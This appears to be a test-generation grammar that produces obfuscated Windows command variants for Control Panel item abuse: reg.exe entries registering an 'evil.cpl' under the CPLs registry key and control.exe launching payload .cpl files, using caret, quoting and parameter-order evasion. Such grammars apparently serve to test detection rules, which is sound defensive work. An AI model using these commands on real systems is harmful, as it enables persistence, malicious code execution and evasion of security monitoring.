win_control_panel_item_grammar ={
    "<start>": [
        "<reg_attack>",
        "<cpl_exec_attack>"
    ],
    "<reg_attack>": [
        "<reg_executable> <reg_verb> <key_path> <params_reordered>"
    ],
    "<cpl_exec_attack>": [
        "<cpl_runner> <cpl_path_evasive>"
    ],
    "<reg_executable>": [
        "reg.exe",
        "REG",
        "%windir%\\system32\\reg.exe"
    ],
    "<reg_verb>": [
        "add",
        "a^dd",
        "\"add\""
    ],
    "<key_path>": [
        "\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs\"",
        "'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\control panel\\cpls'"
    ],
    "<params_reordered>": [
        "<value_param> <type_param> <data_param>",
        "<data_param> <value_param> <type_param>",
        "<type_param> <data_param> <value_param> /f"
    ],
    "<value_param>": [
        "/v MyPayload",
        "/V \"My Payload\""
    ],
    "<type_param>": [
        "/t REG_SZ"
    ],
    "<data_param>": [
        "/d C:\\Users\\Public\\evil.cpl",
        "/d \"%PUBLIC%\\evil.cpl\""
    ],
    "<cpl_runner>": [
        "control.exe",
        "CONTROL",
        "%SystemRoot%\\System32\\control.exe"
    ],
    "<cpl_path_evasive>": [
        "C:\\Temp\\payload.cpl",
        "\"%TEMP%\\payload.cpl\"",
        "C:\\Users\\Public\\my.cpl ''",
        "C:\\Perflogs\\evil.cpl^"
    ]
}
